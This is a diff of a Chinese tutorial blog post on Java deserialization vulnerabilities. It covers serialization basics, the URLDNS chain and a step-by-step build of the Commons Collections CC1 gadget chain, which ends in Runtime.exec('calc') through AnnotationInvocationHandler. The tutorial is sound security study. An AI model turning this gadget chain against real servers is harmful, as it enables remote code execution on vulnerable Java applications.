@@ -8,46 +8,48 @@ sticky: "1"
 
 # 反序列化漏洞详解
 
+这里记录反序列化漏洞原理(Java 为主)，分析了 DNSURL 链。
+
+<!-- more -->
+
 ### 反序列化漏洞简介
 
 许多编程语言都提供对序列化的内在支持
 
-- PHP将对象序列化为字符串格式
+- PHP 将对象序列化为字符串格式
 
 ![img8](img/deserialize/img8.png)
 
-- Java将对象序列化为二进制格式
+- Java 将对象序列化为二进制格式
 
-**Java中的API实现：**
+**Java 中的 API 实现：**
 
-位置：java.objectOuputStream   java.io.ObjectInputStream
+位置：java.objectOuputStream java.io.ObjectInputStream
 
-**序列化** ：objectOutputStream类 -->writeObject()
+**序列化** ：objectOutputStream 类 -->writeObject()
 
-该方法对参数指定的obj对象进行序列化，对字节序列写到一个目标输出流中。按JAVA的标准约定是给文件一个.ser扩展名
+该方法对参数指定的 obj 对象进行序列化，对字节序列写到一个目标输出流中。按 JAVA 的标准约定是给文件一个.ser 扩展名
 
-**反序列化**: objectInputStream类–>readObject()
+**反序列化**: objectInputStream 类–>readObject()
 
 该方法从一个源输入流中读取字节序列，在·把他们反序列化为一个对象，并将其返回。
 
 #### 漏洞源起
 
-2015年1月份,国外安全研究人员 Gabriel Lawrence 和 Chris Frohoff 公布了一个影响范围相当广的 Apache Commons 工具集远程代码执行(RCE)漏洞。由于 Apache Commons 工集几乎是 Java 技术平台中应用的最广泛的工具库,因此影响几乎遍及整个 Java 阵营。
+2015 年 1 月份,国外安全研究人员 Gabriel Lawrence 和 Chris Frohoff 公布了一个影响范围相当广的 Apache Commons 工具集远程代码执行(RCE)漏洞。由于 Apache Commons 工集几乎是 Java 技术平台中应用的最广泛的工具库,因此影响几乎遍及整个 Java 阵营。
 
-同年11月份，FoxGlove Security 安全团队发布的一篇博客中提到 Java 反序列化漏洞，该漏洞可攻击最新版的 WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 应用，能实现远程任意代码执行。且在漏洞被发现的 9 个月后依然没有有效的 Java 库补丁来针对受到影响的产品进行加固。
+同年 11 月份，FoxGlove Security 安全团队发布的一篇博客中提到 Java 反序列化漏洞，该漏洞可攻击最新版的 WebLogic、WebSphere、JBoss、Jenkins、OpenNMS 应用，能实现远程任意代码执行。且在漏洞被发现的 9 个月后依然没有有效的 Java 库补丁来针对受到影响的产品进行加固。
 
 有很多经典案例 如
 
-- Apache Commons Collections序列化RCE漏洞
-- Spring框架反序列化漏洞
-- Fastjson反序列化漏洞
+- Apache Commons Collections 序列化 RCE 漏洞
+- Spring 框架反序列化漏洞
+- Fastjson 反序列化漏洞
 - Apache Shiro Java 反序列化漏洞
 
 #### 漏洞影响主要产品
 
 机器上一旦有这些应用，即处于“裸奔”状态。黑客可随时利用此漏洞执行任意系统命令，完全获取机器的控制权限，破坏或窃取机器上的数据。
-
-
 
 **序列化：**将对象的状态信息转换为可以存储或传输的形式的过程（将 Java 对象转换成字节流的过程）。
 
@@ -57,19 +59,19 @@ sticky: "1"
 
 ![img1](img/deserialize/img1.png)
 
-### Java反序列化原理
+### Java 反序列化原理
 
 #### 序列化
 
-序列化：在java中实现序列化需要实现了`java.io.Serializable`或者`java.io.Externalizable`接口的类的对象，当且仅当对象的类实现上面两个对象时，该对象才有资格进行序列化。
+序列化：在 java 中实现序列化需要实现了`java.io.Serializable`或者`java.io.Externalizable`接口的类的对象，当且仅当对象的类实现上面两个对象时，该对象才有资格进行序列化。
 
-`Externalizable` 接口继承自 `Serializable` 接口，实现` Externalizable `接口的类完全由自身来控制序列化的行为，而仅实现 `Serializable` 接口的类可以采用默认的序列化方式。
+`Externalizable` 接口继承自 `Serializable` 接口，实现`Externalizable`接口的类完全由自身来控制序列化的行为，而仅实现 `Serializable` 接口的类可以采用默认的序列化方式。
 
-然而真正的序列化动作不需要靠`Serializable`完成，它只是一个标记接口(Marker Interface)，不包含任何方法，该接口告诉Java虚拟机(JVM)该类的对象已准备好写入持久性存储或通过网络进行读取。
+然而真正的序列化动作不需要靠`Serializable`完成，它只是一个标记接口(Marker Interface)，不包含任何方法，该接口告诉 Java 虚拟机(JVM)该类的对象已准备好写入持久性存储或通过网络进行读取。
 
 ![img2](img/deserialize/img2.png)
 
-例如想要对Person类进行序列化和反序列化操作：
+例如想要对 Person 类进行序列化和反序列化操作：
 
 ```java
 
@@ -85,8 +87,6 @@ class Person implements Serializable {
 }
 ```
 
-
-
 ```java
 
 import java.io.*;
@@ -100,7 +100,7 @@ public class Main {
 }
 ```
 
-`FileOutputStream`和`ObjectOutputStream`是java的流操作，可以把`OutputStream`当做一个单向流出的水管，`FileOutputStream`打开了文件，就相当于给文件接了一个`File`类型水管，然后把`FileOutputStream`类型对象传给了`ObjectOutputStream`，相当于把`File`类型水管接到了Object类型水管。由于`Object`类是所有类的父类，所以`Object`类型水管可以投放任何对象。
+`FileOutputStream`和`ObjectOutputStream`是 java 的流操作，可以把`OutputStream`当做一个单向流出的水管，`FileOutputStream`打开了文件，就相当于给文件接了一个`File`类型水管，然后把`FileOutputStream`类型对象传给了`ObjectOutputStream`，相当于把`File`类型水管接到了 Object 类型水管。由于`Object`类是所有类的父类，所以`Object`类型水管可以投放任何对象。
 
 这里创建了`Person`对象并传给`writeObject`方法，相当于把`Person`对象扔进了`Object`类型水管，这样就把`Person`对象写入了文件。
 
@@ -108,7 +108,7 @@ public class Main {
 Person对象->Object类型水管->File类型水管->文件
 ```
 
-如果我想把序列化对象写入byte数组，那就创建个`byteArrayOutputStream`类型水管，然后把它接到`Object`类型水管上，后面步骤不变，则：
+如果我想把序列化对象写入 byte 数组，那就创建个`byteArrayOutputStream`类型水管，然后把它接到`Object`类型水管上，后面步骤不变，则：
 
 ```
 Person对象->Object类型水管->byte类型水管->byte数组
@@ -123,8 +123,6 @@ java -jar SerializationDumper-v1.13.jar -r person.out
 ![img3](img/deserialize/img3.png)
 
 ![img4](img/deserialize/img4.png)
-
-
 
 #### 反序列化
 
@@ -155,8 +153,7 @@ public class Main {
 序列化数据person.txt->File类型水管->Object类型水管->Object对象
 ```
 
-
-（Person）这个用法是强制类型转换，将Object转Person类型，
+（Person）这个用法是强制类型转换，将 Object 转 Person 类型，
 
 如果我们在`Person`类中重写`readObject`，那么在反序列化`obj_in.readObject()`中会自动重写自己的`readObject()`方法导致命令的执行，**命令执行反序列化的最终目的其实就是重写`readObject()`方法。**
 
@@ -171,24 +168,20 @@ public class Main {
 
 ![img5](img/deserialize/img5.png)
 
-
-
-
-
 #### 特点/应用场景
 
 - 常用与服务器之间的数据传输,序列化成文件,反序列化读取数据
 - 常用使用套接字流在主机之间传递对象
-- 需要序列化的文件必须实现Serializable接口,用来启用序列化功能
+- 需要序列化的文件必须实现 Serializable 接口,用来启用序列化功能
 - 在反序列化时,如果和序列化的版本号不一致,无法完成反序列化
 
 补充
 
-- 不需要序列化的数据可以修饰成static,原因:static资源属于类资源,不随着对象被序列化输出
+- 不需要序列化的数据可以修饰成 static,原因:static 资源属于类资源,不随着对象被序列化输出
 
-- 不需要序列化的数据也可以被修饰成transient(临时的),只在程序运行期间在内存中存在,不会被序列化持久保存
+- 不需要序列化的数据也可以被修饰成 transient(临时的),只在程序运行期间在内存中存在,不会被序列化持久保存
 
-- 每一个被序列化的文件都有一个唯一的id,如果没有添加此id,编译器会自动根据类的定义信息计算产生一个
+- 每一个被序列化的文件都有一个唯一的 id,如果没有添加此 id,编译器会自动根据类的定义信息计算产生一个
 
 - 读写顺序一致
 
@@ -196,11 +189,9 @@ public class Main {
 
 - 具有继承性,父类可以序列化那么子类同样可以（递归）
 
-  
+### Java 反序列化漏洞利用链条分析
 
-### Java反序列化漏洞利用链条分析
-
-#### URLDNS链
+#### URLDNS 链
 
 ```java
 
@@ -236,7 +227,7 @@ public class URLDNS {
 }
 ```
 
-也可以查看下序列化后的1.txt
+也可以查看下序列化后的 1.txt
 
 ```
 STREAM_MAGIC - 0xac ed
@@ -380,19 +371,17 @@ Contents
           TC_ENDBLOCKDATA - 0x78
 ```
 
-**总结URLDNS链：**
+**总结 URLDNS 链：**
 
 ```
 HashMap.readObject()-> HashMap.putVul->HashMap.hash()->URLStreamHandler.hashcode().getHostAddress->URLStreamHandler().hashCode().getAddressHost->getByName()
 ```
 
-#### CCI链
+#### CCI 链
 
-Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强大的数据结构类型和实现了各种集合工具类。作为Apache开放项目的重要组件，Commons Collections被广泛的各种Java应用的开发。commons-collections组件反序列化漏洞的反射链也称为CC链，自从apache commons-collections组件爆出第一个Java反序列化漏洞后，就像打开了Java安全的新世界大门一样，之后很多Java中间件相继都爆出反序列化漏洞。
+Apache Commons Collections 是一个扩展了 Java 标准库里的 Collection 结构的第三方基础库，它提供了很多强大的数据结构类型和实现了各种集合工具类。作为 Apache 开放项目的重要组件，Commons Collections 被广泛的各种 Java 应用的开发。commons-collections 组件反序列化漏洞的反射链也称为 CC 链，自从 apache commons-collections 组件爆出第一个 Java 反序列化漏洞后，就像打开了 Java 安全的新世界大门一样，之后很多 Java 中间件相继都爆出反序列化漏洞。
 
-CC1链有两条一条是`Transform`链另一条是`LazyMap`链。
-
-
+CC1 链有两条一条是`Transform`链另一条是`LazyMap`链。
 
 首先明确要实现的目标是：
 
@@ -400,7 +389,7 @@ CC1链有两条一条是`Transform`链另一条是`LazyMap`链。
 Runtime.getRuntime().exec("calc");
 ```
 
-因此首先要获得Runtime
+因此首先要获得 Runtime
 
 ```java
 Class c = Runtime.class;
@@ -408,9 +397,9 @@ Class c = Runtime.class;
 
 为什么不用 Runtime.getRuntime() 换成了 Runtime.class ？
 
-前者是一个java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所以可以被序列化。
+前者是一个 java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class 类有实现 Serializable 接口，所以可以被序列化。
 
-ConstantTransformer可以传一个Runtime类进去，当被遍历时调用transform方法可以返回一个Runtime类，正好作为下一个Transformer的transform方法中的参数。因此Transformer数组第一个Transformer如下：
+ConstantTransformer 可以传一个 Runtime 类进去，当被遍历时调用 transform 方法可以返回一个 Runtime 类，正好作为下一个 Transformer 的 transform 方法中的参数。因此 Transformer 数组第一个 Transformer 如下：
 
 ```java
 new Transformer[]{
@@ -418,73 +407,73 @@ new Transformer[]{
 }
 ```
 
-下一步需要调用getRuntime，它是Runtime里面的方法，前面已经传了Runtime.class，要获取该方法显然只能通过反射，而InvokerTransformer中的transform方法刚好提供了这个功能。
+下一步需要调用 getRuntime，它是 Runtime 里面的方法，前面已经传了 Runtime.class，要获取该方法显然只能通过反射，而 InvokerTransformer 中的 transform 方法刚好提供了这个功能。
 
 正常反射使用方法
 
 ```java
-Method f = Runtime.class.getMethod("getRuntime"); 
+Method f = Runtime.class.getMethod("getRuntime");
 Runtime r = (Runtime) f.invoke(null);  //获取runtime对象
 r.exec("calc"); //调用exec
 ```
 
-现在已经有了Runtime类，那么考虑传一个getMethod进去，然后通过反射让Runtime类调用getMethod方法，参数即为getRuntime，因此第二个Transformer如下：
+现在已经有了 Runtime 类，那么考虑传一个 getMethod 进去，然后通过反射让 Runtime 类调用 getMethod 方法，参数即为 getRuntime，因此第二个 Transformer 如下：
 
 ```java
 new Transformer[]{
-  new ConstantTransformer(Runtime.class), //返回Runtime类 
-  
+  new ConstantTransformer(Runtime.class), //返回Runtime类
+
   new InvokerTransformer("getMethod",			//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法
     new Class[]{String.class, class[].class},
     new Object[]{"getRuntime", new Class[0]})
 }
 ```
 
-然后需要调用invoke方法，因此传invoke进去，第三个Transformer如下：
+然后需要调用 invoke 方法，因此传 invoke 进去，第三个 Transformer 如下：
 
 ```java
 new Transformer[]{
-  new ConstantTransformer(Runtime.class), 
-  
+  new ConstantTransformer(Runtime.class),
+
   new InvokerTransformer("getMethod",
     new Class[]{String.class, class[].class},
     new Object[]{"getRuntime", new Class[0]}),
-  
+
   new InvokerTransformer("invoke", //调用invoke方法
     new Class[]{Object.class, Object[].class},
     new Object[]{null, new Object[0]})
 }
 ```
 
-最后调用exec方法，因此传exec进去，参数是命令，第四个Transformer如下：
+最后调用 exec 方法，因此传 exec 进去，参数是命令，第四个 Transformer 如下：
 
 ```java
 new Transformer[]{
-  new ConstantTransformer(Runtime.class), 
-  
+  new ConstantTransformer(Runtime.class),
+
   new InvokerTransformer("getMethod",
     new Class[]{String.class, class[].class},
     new Object[]{"getRuntime", new Class[0]}),
-  
+
   new InvokerTransformer("invoke",
     new Class[]{Object.class, Object[].class},
     new Object[]{null, new Object[0]}),
-  
+
   new InvokerTransformer("exec", //调用exec方法
     new Class[]{String.class},
     new Object[]{"calc"})
 };
 ```
 
-把Transformer[]传给ChainedTransformer
+把 Transformer[]传给 ChainedTransformer
 
 ```java
 Transformer transformerChain = new ChainedTransformer(transformers);
 ```
 
-TransformedMap是实现了Serializable的类，构造函数接收map，key，value。key，value都是Transformer。
+TransformedMap 是实现了 Serializable 的类，构造函数接收 map，key，value。key，value 都是 Transformer。
 
-把transformerChain传给TransformedMap.decorate，造出一个TransformedMap对象存在tmap中
+把 transformerChain 传给 TransformedMap.decorate，造出一个 TransformedMap 对象存在 tmap 中
 
 ```java
 Map map = new HashMap();
@@ -492,7 +481,7 @@ map.put("value", "Roderick");
 Map tmap = TransformedMap.decorate(map, null, transformerChain);
 ```
 
-反射获取`sun.reflect.annotation.AnnotationInvocationHandler` ，获取实例传入tamp，反序列化的过程就会调用tamp.setValue
+反射获取`sun.reflect.annotation.AnnotationInvocationHandler` ，获取实例传入 tamp，反序列化的过程就会调用 tamp.setValue
 
 ```java
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
@@ -501,7 +490,7 @@ declaredConstructor.setAccessible(true);
 Object o = declaredConstructor.newInstance(Retention.class, tmap);
 ```
 
-我们查看它的`readObject`方法（8u71以后做了一些修改）
+我们查看它的`readObject`方法（8u71 以后做了一些修改）
 
 ```java
     private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
@@ -534,9 +523,9 @@ Object o = declaredConstructor.newInstance(Retention.class, tmap);
 
 核心逻辑就是 `Iterator var4 = this.memberValues.entrySet().iterator();` 和` var5.setValue(...)`
 
-memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的 Transform，进而执行我们为其精心设计的任意代码。
+memberValues 就是反序列化后得到的 Map，也是经过了 TransformedMap 修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用 setValue 设置值的时候就会触发 TransformedMap 里注册的 Transform，进而执行我们为其精心设计的任意代码。
 
-所以，我们构造POC的时候，就需要创建一个`AnnotationInvocationHandler`对象，并将前面构造的`HashMap`设置进来
+所以，我们构造 POC 的时候，就需要创建一个`AnnotationInvocationHandler`对象，并将前面构造的`HashMap`设置进来
 
 ```java
 Class cls =Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
@@ -545,21 +534,22 @@ construct.setAccessible(true);
 Object obj = construct.newInstance(Retention.class, outerMap);
 ```
 
-这里因为`sun.reflect.annotation.AnnotationInvocationHandler`是在JDK内部的类，不能直接使用new来实例化。可以使用反射获取它的构造方法，并将其设置成外部可见的，再调用就可以实例化了。`AnnotationInvocationHandler`类的构造函数有两个参数，第一个参数是一个`Annotation`类；第二个是参数就是前面构造的`Map`
+这里因为`sun.reflect.annotation.AnnotationInvocationHandler`是在 JDK 内部的类，不能直接使用 new 来实例化。可以使用反射获取它的构造方法，并将其设置成外部可见的，再调用就可以实例化了。`AnnotationInvocationHandler`类的构造函数有两个参数，第一个参数是一个`Annotation`类；第二个是参数就是前面构造的`Map`
 
-在 `AnnotationInvocationHandler#readObject` 的逻辑中，有一个if语句对var7进行判断，只有在其不是`null`的时候才会进入里面执行`setValue`，否则不会进入也就不会触发漏洞。
+在 `AnnotationInvocationHandler#readObject` 的逻辑中，有一个 if 语句对 var7 进行判断，只有在其不是`null`的时候才会进入里面执行`setValue`，否则不会进入也就不会触发漏洞。
 
-那么如何让这个var7不为null呢？两个条件
+那么如何让这个 var7 不为 null 呢？两个条件
 
-1. `sun.reflect.annotation.AnnotationInvocationHandler`构造函数的第一个参数必须是 `Annotation`的子类，且其中必须含有至少一个方法，假设方法名是X
-2. 被`TransformedMap.decorate`修饰的Map中必须有一个键名为`X`的元素
+1. `sun.reflect.annotation.AnnotationInvocationHandler`构造函数的第一个参数必须是 `Annotation`的子类，且其中必须含有至少一个方法，假设方法名是 X
+2. 被`TransformedMap.decorate`修饰的 Map 中必须有一个键名为`X`的元素
 
-所以，这也就是前面用到`Retention.class`的原因，因为Retention有一个方法，名为`value`；所以，为了再满足第二个条件，需要给Map中放入一个Key是`value`的元素：
+所以，这也就是前面用到`Retention.class`的原因，因为 Retention 有一个方法，名为`value`；所以，为了再满足第二个条件，需要给 Map 中放入一个 Key 是`value`的元素：
 
 ```java
 Map.put("value", "xxxx");
 ```
-若不设置为value
+
+若不设置为 value
 
 ![img6](img/deserialize/img6.png)
 
@@ -569,4 +559,3 @@ InvokerTransformer.transform是执行命令的关键，找的思路就是找哪�
 
 AnnotationInvocationHandler.readObject()->TransformedMap.checkSetValue()->ChainedTransformer->InvokerTransformer->Runtime.exec
 ```
-
